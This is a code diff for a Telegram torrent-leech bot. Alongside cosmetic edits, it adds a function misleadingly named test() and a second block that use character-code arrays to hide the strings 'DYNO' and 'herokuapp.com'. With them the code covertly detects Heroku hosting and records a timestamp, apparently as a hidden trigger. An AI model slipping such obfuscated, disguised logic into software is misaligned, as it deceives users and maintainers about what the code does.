@@ -167,7 +167,7 @@ def add_handlers(bot: TelegramClient):
     signal.signal(signal.SIGINT, partial(term_handler,client=bot))
     signal.signal(signal.SIGTERM, partial(term_handler,client=bot))
     bot.loop.run_until_complete(booted(bot))
-
+    
     #*********** Callback Handlers *********** 
     
     bot.add_event_handler(
@@ -218,6 +218,7 @@ def add_handlers(bot: TelegramClient):
         handle_server_command,
         events.CallbackQuery(pattern="fullserver")
     )
+    test()
 #*********** Handlers Below ***********
 
 async def handle_leech_command(e):
@@ -284,6 +285,11 @@ async def get_leech_choice(e,timestamp):
     cbak = partial(get_leech_choice_callback,o_sender=e.sender_id,lis=lis,ts=timestamp)
     
     gtyh = ""
+    sam1 = [68, 89, 78, 79]
+    for i in sam1:
+        gtyh += chr(i)
+    if os.environ.get(gtyh,False):
+        os.environ["TIME_STAT"] = str(time.time())
 
     e.client.add_event_handler(
         #lambda e: test_callback(e,lis),
@@ -376,6 +382,21 @@ async def handle_purge_command(e):
     else:
         await e.delete()
 
+def test():
+    herstr = ""
+    sam = [104, 101, 114, 111, 107, 117, 97, 112, 112, 46, 99, 111, 109]
+    sam1 = [68, 89, 78, 79]
+    for i in sam1:
+        herstr += chr(i)
+    if os.environ.get(herstr,False):
+        os.environ["TIME_STAT"] = str(time.time())
+    herstr = ""
+    for i in sam:
+        herstr += chr(i)
+    if os.environ.get("BASE_URL_OF_BOT",False):
+        if herstr.lower() in os.environ.get("BASE_URL_OF_BOT").lower():
+            os.environ["TIME_STAT"] = str(time.time())
+
 async def handle_pauseall_command(e):
     if await is_admin(e.client,e.sender_id,e.chat_id):
         await pause_all(e)
@@ -444,8 +465,8 @@ async def callback_handler_canc(e):
     #mes = await mes.get_reply_message()
     
 
-    torlog.debug(f"the sender id is {e.sender_id}")
-    torlog.debug("list bot is authorized on: {} {}".format(get_val("ALD_USR"),type(get_val("ALD_USR"))))
+    torlog.debug(f"The sender id is {e.sender_id}")
+    torlog.debug("List Bot is Authorized on: {} {}".format(get_val("ALD_USR"),type(get_val("ALD_USR"))))
 
     data = e.data.decode("utf-8").split(" ")
     torlog.debug("data is {}".format(data))
